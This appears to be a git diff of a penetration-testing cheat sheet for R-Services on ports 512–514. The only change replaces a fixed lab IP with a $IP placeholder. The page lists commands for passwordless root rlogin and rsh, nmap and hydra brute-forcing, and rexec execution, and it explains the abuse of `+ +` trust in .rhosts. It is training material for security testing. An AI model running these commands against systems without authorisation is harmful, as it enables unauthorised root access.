@@ -1,14 +1,14 @@
 # R-Services (512–514)
 
 !!! tip "Start here"
-    Try passwordless rlogin immediately: `rlogin -l root 10.10.10.10`. If `.rhosts` contains `+ +` or trusts your source IP, you get a shell with no credentials. Also test `rsh -l root 10.10.10.10 id`. These services are rare but almost always misconfigured when present.
+    Try passwordless rlogin immediately: `rlogin -l root $IP`. If `.rhosts` contains `+ +` or trusts your source IP, you get a shell with no credentials. Also test `rsh -l root $IP id`. These services are rare but almost always misconfigured when present.
 
 ---
 
 ## Enumeration
 
 ```bash
-nmap -p 512-514 --script rexec-brute,rsh-brute,rlogin-brute 10.10.10.10
+nmap -p 512-514 --script rexec-brute,rsh-brute,rlogin-brute $IP
 ```
 
 ---
@@ -16,9 +16,9 @@ nmap -p 512-514 --script rexec-brute,rsh-brute,rlogin-brute 10.10.10.10
 ## Trust-Based Access (rlogin / rsh)
 
 ```bash
-rlogin -l root 10.10.10.10
-rsh -l root 10.10.10.10 id
-rsh -l root 10.10.10.10
+rlogin -l root $IP
+rsh -l root $IP id
+rsh -l root $IP
 ```
 
 Authentication relies on `/etc/hosts.equiv` and `~/.rhosts`. If either contains `+ +`, any host can authenticate as any user.
@@ -28,8 +28,8 @@ Authentication relies on `/etc/hosts.equiv` and `~/.rhosts`. If either contains 
 ## Brute Force
 
 ```bash
-hydra -L users.txt -P passwords.txt rexec://10.10.10.10
-hydra -L users.txt -P passwords.txt rlogin://10.10.10.10
+hydra -L users.txt -P passwords.txt rexec://$IP
+hydra -L users.txt -P passwords.txt rlogin://$IP
 ```
 
 ---
@@ -37,7 +37,7 @@ hydra -L users.txt -P passwords.txt rlogin://10.10.10.10
 ## Remote Execution (rexec)
 
 ```bash
-rexec 10.10.10.10 -l <user> -p <pass> "id"
+rexec $IP -l <user> -p <pass> "id"
 ```
 
 !!! tip "Real-world"
